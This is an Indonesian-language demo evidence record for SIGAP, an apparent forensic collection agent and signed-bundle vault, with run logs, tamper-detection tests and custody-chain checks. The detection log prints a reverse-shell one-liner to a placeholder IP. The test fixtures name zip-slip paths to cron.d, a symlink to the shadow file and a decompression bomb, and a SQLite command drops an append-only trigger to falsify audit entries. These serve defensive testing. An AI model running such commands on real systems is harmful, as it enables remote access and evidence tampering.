# Bukti demo SIGAP

Setiap angka di slide, tangkapan layar, dan README harus bisa dilacak ke keluaran nyata.
Dokumen ini mencatat satu run lengkap pada **5 November 2026** beserta keluaran aslinya.

## Lingkungan

| Item | Nilai |
| --- | --- |
| Jalur | B. Tanpa Docker ([cara_mencoba.md](cara_mencoba.md#b-tanpa-docker-linux)), satu host Linux x86_64 |
| Biner | `sigap 1.0.0`, Go 1.22.12, `CGO_ENABLED=0` |
| Vault | Python 3.11, FastAPI 0.115.6, Uvicorn 0.34.0, port 8765 |
| Penyesuaian dari `configs/agent.json` | path lokal, `vault_url` ke `127.0.0.1:8765`, `egress_allowlist` dibuka (lihat catatan) |
| `<demo>` | Direktori kerja sementara run ini (path lokal disamarkan) |
| Bukan benchmark | Waktu verifikasi diukur pada satu mesin dan hanya menunjukkan orde besaran |

Jalur Docker (A) tidak dijalankan pada run ini. Workflow CI (`.github/workflows/ci.yml`)
menjalankan `docker compose build` pada setiap push, tetapi hasil CI tidak dicatat di
dokumen ini.

## Urutan run

1. Vault dijalankan, lalu agen mengambil baseline.
2. Vault dimatikan untuk mensimulasikan link DDIL.
3. `inject_anomaly.py reverse_shell --seconds 20` dijalankan. Ini proses tidur berpola, tanpa koneksi.
4. Bundle dibuat dan ditahan di outbox. Salinannya diverifikasi offline beserta 8 manipulasi dan 1 bundle kunci asing.
5. Vault dijalankan lagi. Agen mengirim bundle, lalu agen dihentikan.
6. Bundle manipulasi, bundle kunci asing, replay, dan unggahan tanpa token dikirim ke vault.
7. Tangkapan layar 01 sampai 03 diambil.
8. Satu entri log kustodi ditulis ulang langsung di SQLite, lalu tangkapan layar 05 diambil.

## 1. Agen: deteksi, koleksi, dan store-and-forward

```
[sigap] agen sensor-01 aktif, baseline diambil, interval 2s
[sigap] ALERT reverse_shell_pattern [critical] pid 16922 cocok pola "/dev/tcp/": <python3> -c import time; time.sleep(20) bash -i >& /dev/tcp/203.0.113.66/4444 0>&1
[sigap] bundle bnd-sensor-01-20261105-001: 6 artefak, sha256 172b89bc1e5a..., <demo>/node/outbox/bnd-sensor-01-20261105-001.zip
[sigap] uplink tertunda, bundle tetap di outbox: Post "http://127.0.0.1:8765/api/bundles": dial tcp 127.0.0.1:8765: connect: connection refused
[sigap] link ke vault pulih
[sigap] uplink: 1 bundle terkirim ke vault
[sigap] berhenti
```

## 2. Isi bundle dan verifikasi offline

```
$ python3 -m zipfile -l bundle.zip
File Name                                             Modified             Size
manifest.json                                  2026-11-05 05:09:00         2321
manifest.sig                                   2026-11-05 05:09:00          172
artifacts/process_list.txt                     2026-11-05 05:09:00        20704
artifacts/net_connections.txt                  2026-11-05 05:09:00         5215
artifacts/system_log.log                       2026-11-05 05:09:00         3080
artifacts/config_redacted.txt                  2026-11-05 05:09:00          181
artifacts/node_meta.json                       2026-11-05 05:09:00          252
artifacts/alert.json                           2026-11-05 05:09:00          386

$ sigap verify --trust trust_store.json bundle.zip
VALID  bundle.zip
  - tanda tangan sah (node-sensor-01-2026-a); 6 artefak cocok
  sha256 bundle: 172b89bc1e5ab2423256191d23aa55ce7bcc6bdde45c906a658f8548b819fb9b
  waktu: 935µs
exit=0

$ python3 tools/make_tampered.py bundle.zip tampered/
01_flip_byte             -> harus TAMPERED
02_add_unlisted          -> harus TAMPERED
03_remove_listed         -> harus INCOMPLETE
04_edit_manifest         -> harus TAMPERED
05_swap_signature        -> harus TAMPERED
07a_zip_slip             -> harus MALFORMED
07b_symlink              -> harus MALFORMED
08_decompression_bomb    -> harus MALFORMED

$ sigap verify --trust trust_store.json tampered/01_flip_byte.zip
TAMPERED  tampered/01_flip_byte.zip
  - hash/ukuran tidak cocok: artifacts/process_list.txt
  sha256 bundle: 3e3bf7babc50989b2a0a4ea5616b25c615576eb1204189ecb0b76695876bad22
  waktu: 968µs
exit=2

$ sigap verify --trust trust_store.json tampered/02_add_unlisted.zip
TAMPERED  tampered/02_add_unlisted.zip
  - berkas tidak terdaftar di manifest: artifacts/extra_payload.txt
  sha256 bundle: 8f446d4e4512dfd187cbe5044bad4a15528d3f7fb1e9c434dc30444881ab7d27
  waktu: 810µs
exit=2

$ sigap verify --trust trust_store.json tampered/03_remove_listed.zip
INCOMPLETE  tampered/03_remove_listed.zip
  - berkas di manifest tidak ada di zip: artifacts/system_log.log
  sha256 bundle: fc639cca7ce57c07bc5dc99c522650cb440cbbae4f076d9f33acec4661f5840b
  waktu: 821µs
exit=3

$ sigap verify --trust trust_store.json tampered/04_edit_manifest.zip
TAMPERED  tampered/04_edit_manifest.zip
  - tanda tangan tidak cocok dengan byte manifest.json
  sha256 bundle: ba43a3c05acfdc6ca81561390eb8f04a2d10f9184283448c44bc971832250ae5
  waktu: 624µs
exit=2

$ sigap verify --trust trust_store.json tampered/05_swap_signature.zip
TAMPERED  tampered/05_swap_signature.zip
  - tanda tangan tidak cocok dengan byte manifest.json
  sha256 bundle: 990c7246a1c8fcc7149c2463559a5c8e61cbf0343d7ba7baf2a4392a8472e4f4
  waktu: 681µs
exit=2

$ sigap verify --trust trust_store.json tampered/07a_zip_slip.zip
MALFORMED  tampered/07a_zip_slip.zip
  - nama berkas ditolak: "../../etc/cron.d/backdoor"
  sha256 bundle: 2b5a6c984d07d442e83c31b205e3a5d133feb8ecb4bf354a9b94d2011a91dad5
  waktu: 127µs
exit=5

$ sigap verify --trust trust_store.json tampered/07b_symlink.zip
MALFORMED  tampered/07b_symlink.zip
  - symlink tidak diizinkan: "artifacts/link_to_shadow.txt"
  sha256 bundle: a03424cbccb42ead4b8a86dbd95263ae882610d4442101cbfd7efa80275988da
  waktu: 79µs
exit=5

$ sigap verify --trust trust_store.json tampered/08_decompression_bomb.zip
MALFORMED  tampered/08_decompression_bomb.zip
  - ukuran terdekompresi 115375671 byte melebihi batas (indikasi bom dekompresi)
  sha256 bundle: 143d2421666b903204711e2e5983ee7d6b2bc44f5ca3148cae097f3a41351e89
  waktu: 606µs
exit=5

$ sigap verify --trust trust_store.json foreign.zip
UNTRUSTED_SIGNER  foreign.zip
  - penanda tangan "attacker-laptop": key_id tidak ada di trust store
  sha256 bundle: e3e76e311b5342e447177500179b151634baa05c442de9f009b0a6150cf1948c
  waktu: 177µs
exit=4
```

Redaksi kredensial (`artifacts/config_redacted.txt` di dalam bundle). Nilai asli di
`simulation/sensor.conf` adalah nilai demo:

```
==> <demo>/etc/sensor.conf (salinan simulation/sensor.conf) <==
# Konfigurasi sensor simulasi (dipantau hash-nya oleh detektor)
mode=patrol
report_interval_s=1
uplink=203.0.113.10:8000
api_key=[REDACTED]
```

Manifest mencatat `"redactions": 1` untuk artefak ini, dan SHA-256-nya dihitung atas byte
yang sudah diredaksi.

## 3. Vault: verifikasi ulang, replay, dan token

Token ditampilkan sebagai `****`.

```
$ curl -H 'Authorization: Bearer ****' -F file=@tampered/01_flip_byte.zip -F 'note=uji: ubah 1 byte' $VAULT/api/bundles
{"bundle_sha256":"3e3bf7babc50989b2a0a4ea5616b25c615576eb1204189ecb0b76695876bad22","duplicate":false,"status":"TAMPERED","reasons":["hash/ukuran tidak cocok: artifacts/process_list.txt"]}

$ curl -H 'Authorization: Bearer ****' -F file=@tampered/03_remove_listed.zip -F 'note=uji: hapus 1 berkas' $VAULT/api/bundles
{"bundle_sha256":"fc639cca7ce57c07bc5dc99c522650cb440cbbae4f076d9f33acec4661f5840b","duplicate":false,"status":"INCOMPLETE","reasons":["berkas di manifest tidak ada di zip: artifacts/system_log.log"]}

$ curl -H 'Authorization: Bearer ****' -F file=@foreign.zip -F 'note=uji: kunci asing' $VAULT/api/bundles
{"bundle_sha256":"e3e76e311b5342e447177500179b151634baa05c442de9f009b0a6150cf1948c","duplicate":false,"status":"UNTRUSTED_SIGNER","reasons":["penanda tangan \"attacker-laptop\": key_id tidak ada di trust store"]}

$ curl -H 'Authorization: Bearer ****' -F file=@bundle.zip -F 'note=uji: replay bundle asli' $VAULT/api/bundles
{"bundle_sha256":"172b89bc1e5ab2423256191d23aa55ce7bcc6bdde45c906a658f8548b819fb9b","duplicate":true,"status":"VALID"}

$ curl -F file=@bundle.zip $VAULT/api/bundles   # tanpa token
HTTP 401

$ curl $VAULT/api/custody/verify
{"ok":true,"broken_at":null,"checked":9,"head_entry_hash":"9dd724f7bea5eddc1548d2171c0155cfa2f0a02fa855b6848b45440a4f7d4918"}
$ curl $VAULT/api/custody/head
{"head_entry_hash":"9dd724f7bea5eddc1548d2171c0155cfa2f0a02fa855b6848b45440a4f7d4918","count":9,"exported_at":"2026-11-05T05:09:39+00:00"}
```

## 4. Penulisan ulang log kustodi

```
# Admin nakal: hapus trigger append-only, ubah TAMPERED menjadi VALID langsung di SQLite
$ sqlite3 vault.sqlite3 "DROP TRIGGER custody_no_update; UPDATE custody_log SET detail='VALID' WHERE action='verified' AND detail='TAMPERED'"
1 baris diubah

$ curl $VAULT/api/custody/verify
{"ok":false,"broken_at":4,"checked":3}
```

`head_entry_hash` tetap sama karena entri terakhir tidak diubah. Karena itu head hash harus
diekspor dan disimpan di luar vault. Pemeriksaan rantai tetap menemukan entri #4 yang diubah.

## Ringkasan

| Skenario | Diharapkan | Hasil | Waktu verifikasi |
| --- | --- | --- | --- |
| Bundle asli | VALID | VALID | 935 µs |
| 01 ubah 1 byte | TAMPERED | TAMPERED | 968 µs |
| 02 tambah berkas | TAMPERED | TAMPERED | 810 µs |
| 03 hapus berkas | INCOMPLETE | INCOMPLETE | 821 µs |
| 04 ubah manifest | TAMPERED | TAMPERED | 624 µs |
| 05 ganti tanda tangan | TAMPERED | TAMPERED | 681 µs |
| 07a zip slip | MALFORMED | MALFORMED | 127 µs |
| 07b symlink | MALFORMED | MALFORMED | 79 µs |
| 08 bom dekompresi | MALFORMED | MALFORMED | 606 µs |
| Kunci Ed25519 asing | UNTRUSTED_SIGNER | UNTRUSTED_SIGNER | 177 µs |
| Replay ke vault | duplicate | `"duplicate":true` | - |
| Unggah tanpa token | ditolak | HTTP 401 | - |
| Rantai kustodi utuh | ok | `ok:true`, 9 entri | - |
| Rantai setelah ditulis ulang | putus | `broken_at: 4` | - |

## Temuan selama run

Percobaan pertama memakai agen yang tetap berjalan saat tangkapan layar diambil. Browser
headless membuka port debugging, dan agen dengan benar melaporkannya sebagai
`new_listen_port`, sehingga muncul enam bundle tambahan. Data itu dibuang, lalu run diulang
dengan agen dihentikan sebelum browser dibuka. Temuan ini dicatat sebagai batasan deteksi
berbasis baseline pada host bersama (lihat [cara_mencoba.md](cara_mencoba.md#masalah-umum)).

## Tangkapan layar

| Berkas | Isi |
| --- | --- |
| `screenshot/01-dashboard-audit.png` | Daftar bundle dengan empat status, head hash, rantai `utuh (9 entri)` |
| `screenshot/02-bundle-valid.png` | Detail bundle VALID: 6 artefak, 1 redaksi, timeline kustodi, replay `duplicate_ignored` |
| `screenshot/03-bundle-tampered.png` | Detail bundle TAMPERED: `hash/ukuran tidak cocok: artifacts/process_list.txt` |
| `screenshot/04-verifikasi-offline.png` | Keluaran `sigap verify` untuk 10 skenario. Baris sha256 tidak ditampilkan |
| `screenshot/05-rantai-kustodi-putus.png` | `PUTUS di entri #4` setelah TAMPERED ditulis ulang menjadi VALID |
